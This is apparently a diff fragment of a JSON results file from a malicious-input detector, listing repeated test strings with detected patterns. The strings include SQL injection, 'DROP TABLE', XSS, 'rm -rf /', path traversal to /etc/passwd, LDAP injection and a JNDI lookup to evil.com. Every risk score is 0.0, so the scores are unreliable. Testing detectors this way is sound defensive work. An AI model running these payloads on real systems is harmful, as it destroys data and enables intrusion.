+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP TABLE users;",
+      "length": 17,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 17,
+        "entropy": 3.85
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm -rf /",
+      "length": 8,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 8,
+        "entropy": 2.5
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import os; os.system('rm -rf /')",
+      "length": 32,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 32,
+        "entropy": 3.93
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm -rf /')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.5
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
